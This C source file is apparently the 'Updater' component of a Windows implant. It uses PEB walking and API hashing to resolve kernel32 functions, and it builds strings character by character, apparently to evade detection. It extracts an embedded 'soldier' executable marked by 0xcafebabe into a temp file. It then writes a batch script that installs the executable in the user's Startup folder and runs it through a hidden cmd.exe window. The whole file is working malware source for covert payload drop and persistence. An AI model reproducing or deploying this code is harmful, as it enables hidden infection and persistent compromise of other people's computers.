#include <Windows.h>
#include <winternl.h>
#include <ShlObj.h>

#include "winapi.h"
#include "Updater.h"

#pragma section(".loader", read,execute)
#pragma code_seg(".loader")

#define FAST_KERNEL32_HANDLE
#define FAST_POINTERS
#define MAX_FILE_NAME 32766


int Updater()
{
	VTABLE lpTable;
	if (!GetVTable(&lpTable))
		return FALSE;

	// if I am in startup and the name is the same, then replace batch
	// else just copy to startup (and check if succeded)

	LPSTR strTempFile = GetTempFile(&lpTable);
	if (strTempFile == NULL)
		return FALSE;

	DWORD dwFileSize;
	LPSTR strSoldierName;
	LPBYTE lpBuffer = FindSoldier(&dwFileSize, &strSoldierName);

	DWORD dwOut;
	HANDLE hFile = lpTable.CreateFileA(strTempFile, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE || lpBuffer == NULL)
	{
		lpTable.VirtualFree(strTempFile, 0, MEM_RELEASE);
		return FALSE;
	}
	lpTable.WriteFile(hFile, lpBuffer, dwFileSize, &dwOut, NULL);
	lpTable.CloseHandle(hFile);

	CHAR strSep[] = { '\\', 0x0 };
	CHAR strExt[] = { '.' , 'e', 'x', 'e', 0x0 };

	LPSTR strStartupPath = GetStartupPath(&lpTable);
	__STRCAT__(strStartupPath, strSep);
	__STRCAT__(strStartupPath, strSoldierName);
	__STRCAT__(strStartupPath, strExt);

	LPSTR strBatchName;
	if (!CreateReplaceBatch(&lpTable, strTempFile, strStartupPath, &strBatchName))
	{
		lpTable.DeleteFileA(strTempFile);
		lpTable.VirtualFree(strTempFile, 0, MEM_RELEASE);
		return FALSE;
	}

	if (!StartBatch(&lpTable, strBatchName))
	{
		lpTable.DeleteFileA(strTempFile);
		lpTable.DeleteFileA(strBatchName);
	}
	else
		lpTable.ExitProcess(0);

	lpTable.VirtualFree(strTempFile, 0, MEM_RELEASE);

	return TRUE;
}

LPBYTE FindSoldier(LPDWORD dwFileSize, LPSTR *strSoldierName)
{
	LPBYTE lpSoldierBuffer = END_UPDATER();

	while (1)
	{
		if (lpSoldierBuffer[0] == 0xca && lpSoldierBuffer[1] == 0xfe && lpSoldierBuffer[2] == 0xba && lpSoldierBuffer[3] == 0xbe) // 0xcafebabe marker per soldiername
			break;
		
		lpSoldierBuffer++;
	}
	lpSoldierBuffer+=4;
	*strSoldierName = (LPSTR)(lpSoldierBuffer);

	while (*((LPDWORD)lpSoldierBuffer) != 0xfefefefe)
		lpSoldierBuffer++;

	lpSoldierBuffer+=4;
	*dwFileSize = *((LPDWORD)lpSoldierBuffer); // FIXME, check MZ

	return lpSoldierBuffer+5;
}

LPSTR GetMySelfName(__in PVTABLE lpTable)
{
	LPSTR strName = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);
	LPSTR strShort = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);
	
	lpTable->GetModuleFileNameA(NULL, strName, 32766*2);
	if (!lpTable->GetShortPathNameA(strName, strShort, 32767*2))
	{
		lpTable->VirtualFree(strShort, 0, MEM_RELEASE);
		return strName;
	}

	lpTable->VirtualFree(strName, 0, MEM_RELEASE);
	return strShort;
}


BOOL AmIFromStartup(__in PVTABLE lpTable)
{
	BOOL bRet;
	LPSTR strStartupPath = GetStartupPath(lpTable);
	LPSTR strCurrentPath = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);

	lpTable->GetModuleFileNameA(NULL, strCurrentPath, MAX_FILE_NAME);

	if (lpTable->StrRChrA(strCurrentPath, NULL, L'\\'))
		*(lpTable->StrRChrA(strCurrentPath, NULL, L'\\')) = 0;

	if (__STRCMPI__(strCurrentPath, strStartupPath))
		bRet = FALSE;
	else
		bRet = TRUE;
	
	lpTable->VirtualFree(strStartupPath, 0, MEM_RELEASE);
	lpTable->VirtualFree(strCurrentPath, 0, MEM_RELEASE);
	
	return bRet;
}

LPSTR GetTempDir(__in PVTABLE lpTable)
{
	LPSTR strTemp = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);
	LPSTR strShort = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);
	
	lpTable->GetTempPathA(MAX_FILE_NAME, strTemp);
	if (lpTable->GetShortPathNameA(strTemp, strShort, MAX_FILE_NAME) == 0)
	{
		lpTable->VirtualFree(strShort, 0, MEM_RELEASE);
		return strTemp;
	}
	
	lpTable->VirtualFree(strTemp, 0, MEM_RELEASE);
	return strShort;
}

LPSTR GetTempFile(__in PVTABLE lpTable)
{
	CHAR strPrefix[] = { L'p', 's', L'\0' };
	LPSTR strTempPath = GetTempDir(lpTable);

	LPSTR strTempFileName = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);	
	if (lpTable->GetTempFileNameA(strTempPath, strPrefix, 0, strTempFileName) == 0)
	{
		lpTable->VirtualFree(strTempFileName, 0, MEM_RELEASE);
		return NULL;
	}
	
	return strTempFileName;
}

LPSTR GetStartupPath(__in PVTABLE lpTable)
{
	LPSTR strStartupPath = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);	
	LPSTR strShortPath = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);	
	
	lpTable->SHGetSpecialFolderPathA(NULL, strStartupPath, CSIDL_STARTUP, FALSE);
	
	if (lpTable->GetShortPathNameA(strStartupPath, strShortPath, 4096) == 0)
	{
		lpTable->VirtualFree(strShortPath, 0, MEM_RELEASE);
		return strStartupPath;
	}

	lpTable->VirtualFree(strStartupPath, 0, MEM_RELEASE);
	return strShortPath;
}

BOOL CreateReplaceBatch(__in PVTABLE lpTable, __in LPSTR strOldFile, __in LPSTR strNewFile, __out LPSTR *strBatchOutName)
{
	BOOL bRet = TRUE;
	DWORD dwOut;

	CHAR strDotBat[] = { '.', 'b', 'a', 't', 0x0 };
	LPSTR strBatchName = GetTempFile(lpTable);
	__STRCAT__(strBatchName, strDotBat);

	LPSTR strBatchBuffer = (LPSTR) lpTable->VirtualAlloc(NULL, (MAX_FILE_NAME+2)*8, MEM_COMMIT, PAGE_READWRITE);

	CHAR strFormat1[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat1);
	__STRCAT__(strBatchBuffer, strNewFile); 

	CHAR strFormat2[] = { '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat2); 
	__STRCAT__(strBatchBuffer, strNewFile); 

	CHAR strFormat3[] = { '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat3); 
	__STRCAT__(strBatchBuffer, strOldFile);

	CHAR strFormat4[] = { '"', ' ', '>', ' ', '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat4); 
	__STRCAT__(strBatchBuffer, strNewFile);

	CHAR strFormat5[] = { '"', '\r', '\n', 's', 't', 'a', 'r', 't', ' ', '/', 'B', ' ', 'c', 'm', 'd', ' ', '/', 'c', ' ', '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat5); 
	__STRCAT__(strBatchBuffer, strNewFile);

	CHAR strFormat6[] = { '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat6); 
	__STRCAT__(strBatchBuffer, strOldFile);

	CHAR strFormat7[] = { '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat7); 
	__STRCAT__(strBatchBuffer, strBatchName);

	CHAR strFormat8[] = { '"', 0x0 };
	__STRCAT__(strBatchBuffer, strFormat8); 

	HANDLE hFile = lpTable->CreateFileA(strBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		bRet = FALSE;
		lpTable->VirtualFree(strBatchName, 0, MEM_RELEASE);
	}
	else
	{
		lpTable->WriteFile(hFile, strBatchBuffer, __STRLEN__(strBatchBuffer), &dwOut, NULL);
		lpTable->CloseHandle(hFile);
		*strBatchOutName = strBatchName;
	}

	lpTable->VirtualFree(strBatchBuffer, 0, MEM_RELEASE);
	return bRet;
}


BOOL StartBatch(__in PVTABLE lpTable, __in LPSTR strName)
{
	BOOL bRet;
		
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	LPSTR pApplicationName = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);
	LPSTR pInterpreter = (LPSTR) lpTable->VirtualAlloc(NULL, MAX_FILE_NAME+2, MEM_COMMIT, PAGE_READWRITE);

	CHAR strOpts[] = { '/', 'c', L' ', '"', '%', 's', '"', 0x0 };
	CHAR pTempInterpreter[] = { '%', 'S', 'Y', 'S', 'T', 'E', 'M', 'R', 'O', 'O', 'T', '%', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0x0 };
	

	lpTable->ExpandEnvironmentStringsA(pTempInterpreter, pInterpreter, MAX_FILE_NAME);
	lpTable->wnsprintfA(pApplicationName, MAX_FILE_NAME, strOpts, strName);

	for (DWORD i=0; i<sizeof(STARTUPINFO); i++)
		((LPBYTE)(&si))[i] = 0;

	for (DWORD i=0; i<sizeof(PROCESS_INFORMATION); i++)
		((LPBYTE)(&pi))[i] = 0;

	
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	
	bRet = lpTable->CreateProcessA(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	lpTable->VirtualFree(pApplicationName, 0, MEM_RELEASE);
	lpTable->VirtualFree(pInterpreter, 0, MEM_RELEASE);
	
	return bRet;
}

DWORD GetStringHash(
	__in LPVOID lpBuffer, 
	__in BOOL bUnicode, 
	__in UINT uLen)
{
	DWORD dwHash = 0;
	LPSTR strBuffer = (LPSTR) lpBuffer;

	while (uLen--)
    {
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash +=  (DWORD)*strBuffer++;

		if (bUnicode)
				strBuffer++;			
    }
    return dwHash;
}


HANDLE GetKernel32Handle()
{
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#ifdef _WIN64
	PPEB lpPeb = (PPEB) __readgsqword(0x60);
#else
	PPEB lpPeb = (PPEB) __readfsdword(0x30);
#endif
	PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;	

#ifdef SUX_KERNEL32_HANDLE
	hKernel32 = 
		(CONTAINING_RECORD(pListEntry->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))->DllBase;
#elif defined FAST_KERNEL32_HANDLE
	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen	= pModEntry->FullDllName.Length;
			PWCHAR strName = (pModEntry->FullDllName.Buffer + (dwLen/sizeof(WCHAR))) - 13;

			if (GetStringHash(strName, TRUE, 13) == 0x8fecdbff || GetStringHash(strName, TRUE, 13) == 0x6e2bcfd7 || GetStringHash(strName, TRUE, 13) == 0x6f2bd7f7)
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}
#else
	WCHAR strDllName[MAX_PATH];
	WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen	= pModEntry->FullDllName.Length;

			__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);
			strDllName[dwLen/sizeof(WCHAR)] = L'\0';

			if (__STRSTRIW__(strDllName, strKernel32))
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}

#endif

	return hKernel32;
}

BOOL GetPointers(
	__out PGETPROCADDRESS fpGetProcAddress, 
	__out PLOADLIBRARYA fpLoadLibraryA)
{
	HANDLE hKernel32 = GetKernel32Handle();
	if (hKernel32 == INVALID_HANDLE_VALUE)
		return FALSE;

	LPBYTE lpBaseAddr = (LPBYTE) hKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER) lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) (lpBaseAddr + lpDosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) (lpBaseAddr +  pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfFunctions);
	LPWORD pOrdArray  = (LPWORD) (lpBaseAddr+ pExportDir->AddressOfNameOrdinals);

	*fpGetProcAddress = NULL;
	*fpLoadLibraryA = NULL;

#ifdef FAST_POINTERS
	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);
	
		if (GetStringHash(pFuncName, FALSE, 14) == 0x7c0dfcaa) 
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		else if (GetStringHash(pFuncName, FALSE, 12) == 0xec0e4e8e)
			*fpLoadLibraryA = (LOADLIBRARYA) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
	
		if (*fpGetProcAddress && *fpLoadLibraryA)
			return TRUE;
	}
#else
	CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
	CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);

		if (!__STRCMPI__(pFuncName, strGetProcAddress))
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		else if (!__STRCMPI__(pFuncName, strLoadLibraryA))
			*fpLoadLibraryA = (LOADLIBRARYA) (lpBaseAddr + pAddrArray[pOrdArray[i]]);

		if (*fpGetProcAddress && *fpLoadLibraryA)
			return TRUE;
	}
#endif

	return FALSE;
}


BOOL GetVTable(__out PVTABLE lpTable)
{
	if (!GetPointers(&lpTable->GetProcAddress, &lpTable->LoadLibraryA))
		return FALSE; // FIXME

	CHAR strKernel32[] = { 'k',  'e',  'r',  'n',  'e',  'l',  '3', '2', 0x0 };
	CHAR strShell32[] = { 's',  'h',  'e',  'l',  'l',  '3',  '2', 0x0 };
	CHAR strShlWapi[] = { 'S',  'h',  'l',  'w',  'a',  'p',  'i', 0x0 };

	CHAR strVirtualAlloc[] = { 'V',  'i',  'r',  't',  'u',  'a',  'l',  'A',  'l',  'l',  'o',  'c', 0x0 };
	CHAR strGetModuleFileNameA[] = { 'G',  'e',  't',  'M',  'o',  'd',  'u',  'l',  'e',  'F',  'i',  'l',  'e',  'N',  'a',  'm',  'e',  'A', 0x0 };
	CHAR strGetTempPathA[] = { 'G',  'e',  't',  'T',  'e',  'm',  'p',  'P',  'a',  't',  'h',  'A', 0x0 };
	CHAR strGetTempFileNameA[] = { 'G',  'e',  't',  'T',  'e',  'm',  'p',  'F',  'i',  'l',  'e',  'N',  'a',  'm',  'e',  'A', 0x0 };
	CHAR strVirtualFree[] = { 'V',  'i',  'r',  't',  'u',  'a',  'l',  'F',  'r',  'e',  'e', 0x0 };
	CHAR strGetShortPathNameA[] = { 'G',  'e',  't',  'S',  'h',  'o',  'r',  't',  'P',  'a',  't',  'h',  'N',  'a',  'm',  'e',  'A', 0x0 };
	CHAR strSHGetSpecialFolderPathA[] = { 'S',  'H',  'G',  'e',  't',  'S',  'p',  'e',  'c',  'i',  'a',  'l',  'F',  'o',  'l',  'd',  'e',  'r',  'P',  'a',  't',  'h',  'A', 0x0 };
	CHAR strStrRChrA[] = { 'S',  't',  'r',  'R',  'C',  'h',  'r',  'A', 0x0 };
	CHAR strCloseHandle[] = { 'C',  'l',  'o',  's',  'e',  'H',  'a',  'n',  'd',  'l',  'e', 0x0 };
	CHAR strCreateFileA[] = { 'C',  'r',  'e',  'a',  't',  'e',  'F',  'i',  'l',  'e',  'A', 0x0 };
	CHAR strDeleteFileA[] = { 'D',  'e',  'l',  'e',  't',  'e',  'F',  'i',  'l',  'e',  'A', 0x0 };
	CHAR strCreateProcessA[] = { 'C',  'r',  'e',  'a',  't',  'e',  'P',  'r',  'o',  'c',  'e',  's',  's',  'A', 0x0 };
	CHAR strSleep[] = { 's', 'l', 'e', 'e', 'p', 0x0 };
	CHAR strExpandEnvironmentStringsA[] = { 'E',  'x',  'p',  'a',  'n',  'd',  'E',  'n',  'v',  'i',  'r',  'o',  'n',  'm',  'e',  'n',  't',  'S',  't',  'r',  'i',  'n',  'g',  's',  'A', 0x0 };
	CHAR strWriteFile[] = { 'W',  'r',  'i',  't',  'e',  'F',  'i',  'l',  'e', 0x0 };
	CHAR strWnsprintfA[] = { 'w',  'n',  's',  'p',  'r',  'i',  'n',  't',  'f',  'A', 0x0 };
	CHAR strExitProcess[] = { 'E',  'x',  'i',  't',  'P',  'r',  'o',  'c',  'e',  's',  's', 0x0 };

	// KERNEL32
	lpTable->VirtualAlloc = (VIRTUALALLOC) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strVirtualAlloc);
	lpTable->VirtualFree = (VIRTUALFREE) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strVirtualFree);
	lpTable->CreateFileA  = (CREATEFILEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strCreateFileA);
	lpTable->WriteFile  = (WRITEFILE) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strWriteFile);
	lpTable->CloseHandle  = (CLOSEHANDLE) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strCloseHandle);
	lpTable->GetModuleFileNameA = (GETMODULEFILENAMEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strGetModuleFileNameA);
	lpTable->GetShortPathNameA = (GETSHORTPATHNAMEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strGetShortPathNameA);
	lpTable->GetTempPathA= (GETTEMPPATHA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strGetTempPathA);
	lpTable->GetTempFileNameA = (GETTEMPFILENAMEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strGetTempFileNameA);
	lpTable->DeleteFileA = (DELETEFILEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strDeleteFileA);
	lpTable->CreateProcessA = (CREATEPROCESSA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strCreateProcessA);
	lpTable->Sleep = (SLEEP) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strSleep);
	lpTable->ExpandEnvironmentStringsA = (EXPANDENVIRONMENTSTRINGA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strExpandEnvironmentStringsA);
	lpTable->ExitProcess = (EXITPROCESS) lpTable->GetProcAddress(lpTable->LoadLibraryA(strKernel32), strExitProcess);

	// SHELL32
	lpTable->SHGetSpecialFolderPathA = (SHGETSPECIALFOLDERPATHA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strShell32), strSHGetSpecialFolderPathA);

	// Shlwapi
	lpTable->StrRChrA = (STRRCHRA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strShlWapi), strStrRChrA);
	lpTable->wnsprintfA = (WNSPRINTFA) lpTable->GetProcAddress(lpTable->LoadLibraryA(strShlWapi), strWnsprintfA);

	return TRUE;
}


UINT __STRLEN__(__in LPSTR lpStr1)
{
	UINT i = 0;
	while(lpStr1[i] != 0x0)
		i++;

	return i;
}

LPSTR __STRCAT__(
	__in LPSTR	strDest, 
	__in LPSTR strSource)
{
	LPSTR d = strDest;
	LPSTR s = strSource;

	while(*d) d++;
	
	do { *d++ = *s++; } while(*s);
	*d = 0x0;

	return strDest;
}

BOOL __ISUPPER__(__in CHAR c) { return ('A' <= c) && (c <= 'Z'); };
CHAR __TOLOWER__(__in CHAR c) { return __ISUPPER__(c) ? c - 'A' + 'a' : c ; };

INT __STRCMPI__(
	__in LPSTR lpStr1, 
	__in LPSTR lpStr2)
{
	int  v;
	CHAR c1, c2;
	do
	{
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		// The casts are necessary when pStr1 is shorter & char is signed 
		v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
	}
	while ((v == 0) && (c1 != '\0') && (c2 != '\0') );
	return v;
}

LPBYTE END_UPDATER()
{
	LPBYTE lpBuff;

	__asm
	{
		call get_pc
get_pc:
		pop eax
		mov lpBuff, eax
	}

	return lpBuff;
}